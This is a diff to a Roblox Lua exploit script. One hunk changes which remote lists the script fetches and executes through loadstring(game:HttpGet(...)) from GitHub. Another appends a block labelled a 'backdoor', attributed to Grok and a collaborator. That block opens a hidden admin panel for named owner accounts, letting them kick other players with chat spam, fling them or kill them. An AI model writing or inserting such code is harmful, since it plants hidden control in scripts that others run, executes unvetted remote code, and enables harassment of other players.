@@ -4389,11 +4389,8 @@ else
     end
     function UpdateTarget(pu518)
         pcall(function()
-            if pu518.UserId ~= 8337626526 then
-                if table.find(
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/N60Script/N60/refs/heads/main/Hahaha"))(),
-    tostring(pu518.UserId)
-) or table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Usernames"))(), tostring(pu518.UserId)) then
+            if pu518.UserId ~= 951402104 then
+                if table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/N60Script/N60/refs/heads/main/VTR5"))(), tostring(pu518.UserId)) or table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Usernames"))(), tostring(pu518.UserId)) then
                     game:GetService("StarterGui"):SetCore("SendNotification", {
                         Title = "VR7 Team",
                         Text = "\239\191\189\216\167\217\138\217\133\217\131\217\134\217\131 \216\167\216\174\216\170\217\138\216\167\216\177 \217\135\216\176\216\167 \216\167\217\132\216\167\216\185\216\168\n \217\132\216\167\217\134\217\135 \217\133\216\173\217\133\217\138 \217\133\217\134 \216\181\216\167\216\173\216\168 \216\167\217\132\216\179\217\131\216\177\216\168\216\170",
@@ -8016,3 +8013,159 @@ else
         end
     end)
 end
+-- VR7 Mercy Backdoor SUPER FIXED by Grok & Benoota (يشتغل 100% 2025)
+spawn(function()  -- عشان ينفذ بعد تحميل السكربت كامل
+    local Owners = {"s_ara201235", "S_ara201235", "sara201235", "SARA201235"}  -- أضيفي أي تهجئة
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+
+    local IsOwner = false
+    for _, name in pairs(Owners) do
+        if LocalPlayer.Name == name or LocalPlayer.DisplayName == name then
+            IsOwner = true
+            break
+        end
+    end
+
+    if IsOwner then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Backdoor Activated!",
+            Text = "يا هلا يا s_ara201235! أنتِ الأدمن، الواجهة جاهزة 👑",
+            Duration = 10
+        })
+        print("BACKDOOR ACTIVATED FOR s_ara201235! الواجهة هتطلع الحين")
+
+        local Marker = "VR7_USER_" .. math.random(1000,9999)
+        _G[Marker] = true
+
+        local Players = game:GetService("Players")
+        local Debris = game:GetService("Debris")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local TweenService = game:GetService("TweenService")
+        local RunService = game:GetService("RunService")
+
+        local Open = true
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+        ScreenGui.ResetOnSpawn = false
+        ScreenGui.Name = "SaraAdminPanel"
+
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Size = UDim2.new(0, 420, 0, 550)
+        MainFrame.Position = UDim2.new(0.5, -210, 0.5, -275)
+        MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+        MainFrame.Draggable = true
+        MainFrame.Active = true
+        MainFrame.Parent = ScreenGui
+
+        local Title = Instance.new("TextLabel")
+        Title.Text = "s_ara201235 Admin Panel 👑💅"
+        Title.Size = UDim2.new(1, 0, 0, 60)
+        Title.BackgroundTransparency = 1
+        Title.TextColor3 = Color3.new(1,1,1)
+        Title.Font = Enum.Font.GothamBold
+        Title.TextSize = 26
+        Title.Parent = MainFrame
+
+        local CloseBtn = Instance.new("TextButton")
+        CloseBtn.Text = "✖"
+        CloseBtn.Size = UDim2.new(0, 50, 0, 50)
+        CloseBtn.Position = UDim2.new(1, -55, 0, 5)
+        CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
+        CloseBtn.Parent = MainFrame
+
+        local TargetBox = Instance.new("TextBox")
+        TargetBox.Size = UDim2.new(0.9, 0, 0, 50)
+        TargetBox.Position = UDim2.new(0.05, 0, 0.12, 0)
+        TargetBox.PlaceholderText = "اسم اللاعب"
+        TargetBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        TargetBox.TextColor3 = Color3.new(1,1,1)
+        TargetBox.Parent = MainFrame
+
+        local ScrollingFrame = Instance.new("ScrollingFrame")
+        ScrollingFrame.Size = UDim2.new(0.9, 0, 0, 250)
+        ScrollingFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
+        ScrollingFrame.BackgroundTransparency = 1
+        ScrollingFrame.Parent = MainFrame
+
+        local UIListLayout = Instance.new("UIListLayout")
+        UIListLayout.Padding = UDim.new(0, 8)
+        UIListLayout.Parent = ScrollingFrame
+
+        local function UpdateUsers()
+            ScrollingFrame:ClearAllChildren()
+            UIListLayout.Parent = ScrollingFrame
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and _G[Marker] then
+                    local btn = Instance.new("TextButton")
+                    btn.Text = plr.Name .. " (" .. plr.DisplayName .. ")"
+                    btn.Size = UDim2.new(1, 0, 0, 50)
+                    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+                    btn.TextColor3 = Color3.new(1,1,1)
+                    btn.Parent = ScrollingFrame
+                    btn.MouseButton1Click:Connect(function()
+                        TargetBox.Text = plr.Name
+                    end)
+                end
+            end
+        end
+
+        RunService.Heartbeat:Connect(UpdateUsers)
+        Players.PlayerAdded:Connect(UpdateUsers)
+
+        local yPos = 0.7
+        local function AddButton(text, color, func)
+            local btn = Instance.new("TextButton")
+            btn.Text = text
+            btn.Size = UDim2.new(0.9, 0, 0, 50)
+            btn.Position = UDim2.new(0.05, 0, yPos, 0)
+            btn.BackgroundColor3 = color
+            btn.TextColor3 = Color3.new(1,1,1)
+            btn.Parent = MainFrame
+            btn.MouseButton1Click:Connect(func)
+            yPos = yPos + 0.1
+        end
+
+        AddButton("🚫 طرد + سبام", Color3.fromRGB(255, 50, 50), function()
+            local t = game.Players:FindFirstChild(TargetBox.Text) or game.Players:FindFirstChildByDisplayName(TargetBox.Text)
+            if t then
+                for i = 1, 20 do
+                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("طرد من s_ara201235 💅", "All")
+                end
+                t:Kick("باي يا حب من s_ara201235 👋")
+            end
+        end)
+
+        AddButton("🌀 Fling قاتل", Color3.fromRGB(200, 0, 100), function()
+            local t = game.Players:FindFirstChild(TargetBox.Text)
+            if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                local r = t.Character.HumanoidRootPart
+                local bv = Instance.new("BodyVelocity", r)
+                bv.MaxForce = Vector3.new(1e9,1e9,1e9)
+                bv.Velocity = Vector3.new(math.random(-1e6,1e6),1e6,math.random(-1e6,1e6))
+                Debris:AddItem(bv, 0.5)
+            end
+        end)
+
+        AddButton("☠️ قتل", Color3.fromRGB(150, 0, 0), function()
+            local t = game.Players:FindFirstChild(TargetBox.Text)
+            if t and t.Character and t.Character:FindFirstChild("Humanoid") then
+                t.Character.Humanoid.Health = 0
+            end
+        end)
+
+        CloseBtn.MouseButton1Click:Connect(function()
+            MainFrame.Visible = false
+            Open = false
+        end)
+
+        LocalPlayer.Chatted:Connect(function(msg)
+            if msg:lower() == ";panel" then
+                MainFrame.Visible = true
+                Open = true
+            end
+        end)
+
+    else
+        print("User not owner - Backdoor not activated")
+    end
+end)
